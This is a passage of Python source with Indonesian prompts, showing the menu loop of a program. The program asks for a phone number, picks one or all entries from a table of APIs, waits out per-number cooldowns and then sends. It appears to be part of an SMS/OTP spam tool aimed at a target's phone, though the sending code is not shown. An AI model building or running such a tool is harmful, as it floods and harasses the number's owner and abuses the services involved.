        raw = Prompt.ask(f"[bold cyan]  >[/bold cyan] Nomor{hint}")
        if raw.strip() == "" and current:
            return current
        p = validate_phone(raw)
        if len(p) >= 10:
            return p
        console.print("[bold red]  ✗ Nomor tidak valid.[/bold red]")

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main():
    signal.signal(signal.SIGINT, signal.SIG_DFL)
    current_phone = ""

    while True:
        print_home(current_phone)

        try:
            flush_stdin()
            raw    = Prompt.ask("[bold cyan]  >[/bold cyan] Pilih  [dim](0=exit)[/dim]")
            choice = int(raw.strip())
        except (ValueError, EOFError):
            time.sleep(0.3)
            continue
        except KeyboardInterrupt:
            clean_exit()

        if choice == 0:
            clean_exit()

        if choice not in APIS:
            time.sleep(0.3)
            continue

        api = APIS[choice]

        # ── Input nomor
        clr()
        console.print()
        console.print(Align.center(Panel(
            f"[{api['color']}]◈  {api['name']}  [{api['tag']}][/{api['color']}]",
            border_style="cyan", box=box.DOUBLE_EDGE, padding=(0, 6),
        )))
        console.print()
        try:
            current_phone = ask_phone(current_phone)
        except KeyboardInterrupt:
            continue
        console.print()

        targets = ([v for v in APIS.values() if v["method"] != "all"]
                   if api["method"] == "all" else [api])

        # ── Cek CD awal
        locked = [a for a in targets
                  if get_rem(current_phone, a["method"], a["cooldown"]) > 0]

        if locked:
            console.print(Align.center(
                build_cd_panel(current_phone, targets,
                               title="[bold red]⏳  COOLDOWN AKTIF[/bold red]")
            ))
            console.print(
                "\n  [bold cyan]Y[/bold cyan] = Tunggu CD selesai lalu lanjut"
                "\n  [bold red]N[/bold red]  = Batal\n"
            )
            try:
                flush_stdin()
                ans = Prompt.ask("[bold cyan]  >[/bold cyan]",
                                 default="y").strip().lower()
            except (KeyboardInterrupt, EOFError):
                continue
            if ans != "y":
                continue
            try:
                wait_until_ready(current_phone, targets)
            except KeyboardInterrupt:
                continue

        # ── Pilih Y/R/N sebelum kirim
        first_ans = ask_yrn(before_send=True)
        if first_ans == "n":
            continue

        if api["method"] == "all":
            session_all(current_phone, first_ans)
        else:
            session_single(api, current_phone, first_ans)

        time.sleep(0.3)


if __name__ == "__main__":
    main()
